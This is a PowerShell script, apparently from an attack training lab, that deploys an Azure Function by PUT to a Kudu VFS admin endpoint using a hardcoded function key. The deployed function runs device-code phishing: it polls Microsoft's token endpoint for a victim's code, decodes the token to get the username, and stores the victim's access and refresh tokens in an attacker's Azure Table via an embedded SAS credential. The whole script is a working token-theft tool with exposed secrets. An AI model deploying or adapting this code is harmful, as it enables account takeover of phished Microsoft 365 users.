$URL = " https://ddcattackfunapp.azurewebsites.net/admin/vfs/site/wwwroot/studentX/run.ps1"

$Params = @{
    "URI"     = $URL
    "Method"  = "PUT"
    "Headers" = @{
    "Content-Type" = "application/octet-stream"
    "x-functions-key" = "d9I2c3XAGVoND_72tJAk0Cbpah7nMlr6HTE4fDNan47sAzFuy5fANg=="
    }
}


$Body = @'
using namespace System.Net

# Input bindings are passed in via param block.
param($Request, $TriggerMetadata)

# Write to the Azure Functions log stream.
Write-Host "PowerShell HTTP trigger function processed a request."
Import-Module AzTable
Import-Module Az.Storage
$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
$Resource = "https://graph.microsoft.com"
$GrantType = "urn:ietf:params:oauth:grant-type:device_code"

# Interact with query parameters or the body of the request.
$device_code = $Request.Query.code
Write-Host $device_code
if("" -ne $device_code -or $null -ne $device_code)
{

    $continue = $true
    while($continue)
    {
        Start-Sleep -Seconds 5
        $body=@{
            "client_id" =  $ClientID
            "grant_type" = $GrantType
            "code" =       $device_code
        }
        try
        {
            $global:Tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Body $body -ErrorAction SilentlyContinue
        }
        catch
        {

        }
        if($Tokens)
        {
            Write-Host $Tokens
            # Set the connection string for the storage account
            $connectionString = "BlobEndpoint=https://ddcattackstorage.blob.core.windows.net/;TableEndpoint=https://ddcattackstorage.table.core.windows.net/;SharedAccessSignature=sv=2022-11-02&ss=bt&srt=sco&sp=rwdlacuitfx&se=2025-09-11T16:08:54Z&st=2023-09-11T08:08:54Z&spr=https,http&sig=oDRh5IkmzF%2Fbf10iTi4xh%2FMRajhVINC7vpmJ9Zs%2BdDE%3D"

            # Create a storage context from the connection string
            $context = New-AzStorageContext -ConnectionString $connectionString

            $TableName = "studentX"

            $cloudTable = (Get-AzStorageTable -Name $TableName -Context $context).CloudTable

            #Payload
            $Payload = $Tokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')

            #Fix padding as needed, keep adding "=" until string length modulus 4 reaches 0
            while ($Payload.Length % 4) {
                $Payload += "="
            }    
            $tokenByteArray = [System.Convert]::FromBase64String($Payload)

            $tokenvalue = ([System.Text.Encoding]::ASCII.GetString($tokenByteArray) | ConvertFrom-Json)
            Write-Host $tokenvalue

            # Insert Data in the Table
            $TableRow = @{
                "Access_Token"=$Tokens.access_token;
                "Refresh_Token"= $Tokens.refresh_token;
                "RawData" = $Tokens;
                "UserName" = $tokenvalue.upn
            }
            Add-AzTableRow -Table $cloudTable -PartitionKey (New-Guid).Guid -RowKey (New-Guid).Guid -property $TableRow
            break
        }   
    }
    

    # Associate values to output bindings by calling 'Push-OutputBinding'.
    Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
        StatusCode = [HttpStatusCode]::OK
        Body = "Success"
    })
}
else {
    
    # Associate values to output bindings by calling 'Push-OutputBinding'.
    Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
        StatusCode = [HttpStatusCode]::OK
        Body = "code query string variable not found"
    })
}

'@

Invoke-RestMethod @Params -UseBasicParsing -Body $Body
